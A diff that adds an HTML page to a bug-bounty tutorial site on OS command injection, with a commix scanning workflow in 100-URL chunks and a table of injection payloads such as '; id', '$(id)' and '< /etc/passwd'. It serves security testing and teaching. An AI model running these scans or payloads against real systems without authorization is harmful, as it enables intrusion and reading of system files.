@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Injection - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link active">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Page Header -->
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>Command Injection</span>
+        </div>
+        <h1><i class="fas fa-terminal"></i> Command Injection (CMDi)</h1>
+        <p>OS command injection testing methodology with controlled chunks scanning.</p>
+    </header>
+
+    <!-- Content Section -->
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-info-circle"></i> Requirements</h2>
+                <p><strong>Required:</strong> <code>parameter.txt</code> must exist (combined output from ParamSpider / Arjun / FFUF).</p>
+                <p>The goal is to <strong>reduce noise</strong>, scan safely, and test CMD injection in <strong>controlled chunks of 100 URLs</strong>.</p>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-list-ol"></i> CMD Injection Workflow</h2>
+
+                <h3>Step 1: Filter CMDi-Relevant Parameters</h3>
+                <p>Filter parameters that commonly lead to command injection:</p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>grep -Ei "ip|host|ping|cmd|exec|shell|run|query" parameter.txt > cmdi_all.txt</pre>
+                </div>
+
+                <h3>Step 2: Remove Duplicates</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>sort -u cmdi_all.txt > cmdi_unique.txt</pre>
+                </div>
+
+                <h3>Step 3: Keep Only Valid Parameterized URLs</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>grep "=" cmdi_unique.txt > cmdi_final.txt</pre>
+                </div>
+
+                <h3>Step 4: Split into Chunks (100 URLs per file)</h3>
+                <p>Example output files: <code>cmdi_aa</code>, <code>cmdi_ab</code>, <code>cmdi_ac</code>...</p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>split -l 100 cmdi_final.txt cmdi_</pre>
+                </div>
+
+                <h3>Step 5: Safe Initial Detection Scan (Fast, Low Noise)</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>commix -m /path/to/cmdi_aa --batch --level=1</pre>
+                </div>
+
+                <h3>Step 6: Deeper Confirmation Scan</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>commix -m /path/to/cmdi_aa --batch --level=2</pre>
+                </div>
+
+                <h3>Step 7: Blind / Time-Based CMD Injection (Last Option)</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>commix -m /path/to/cmdi_aa --batch --level=3 --technique=t</pre>
+                </div>
+
+                <h3>Step 8: Move to Next 100 URLs</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>commix -m /path/to/cmdi_ab --batch --level=1</pre>
+                </div>
+
+                <h3>Step 9: Save Detailed Results</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>commix -m /path/to/cmdi_aa --batch --level=2 --output-dir=commix_results</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-lightbulb"></i> Recommended Flow</h2>
+                <p><code>level=1 &rarr; level=2 &rarr; level=3 (only if needed)</code></p>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-bolt"></i> Common CMDi Payloads</h2>
+                <table>
+                    <tr>
+                        <th>Type</th>
+                        <th>Payload</th>
+                    </tr>
+                    <tr>
+                        <td>Semicolon</td>
+                        <td><code>; id</code></td>
+                    </tr>
+                    <tr>
+                        <td>AND Operator</td>
+                        <td><code>&amp;&amp; id</code></td>
+                    </tr>
+                    <tr>
+                        <td>OR Operator</td>
+                        <td><code>|| id</code></td>
+                    </tr>
+                    <tr>
+                        <td>Pipe</td>
+                        <td><code>| id</code></td>
+                    </tr>
+                    <tr>
+                        <td>Backticks</td>
+                        <td><code>`id`</code></td>
+                    </tr>
+                    <tr>
+                        <td>Dollar</td>
+                        <td><code>$(id)</code></td>
+                    </tr>
+                    <tr>
+                        <td>Redirect</td>
+                        <td><code>&lt; /etc/passwd</code></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+            <p>Made with <i class="fas fa-heart"></i> for the security community</p>
+        </div>
+    </footer>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast">Copied to clipboard!</div>
+
+    <script src="script.js"></script>
+</body>
+</html>
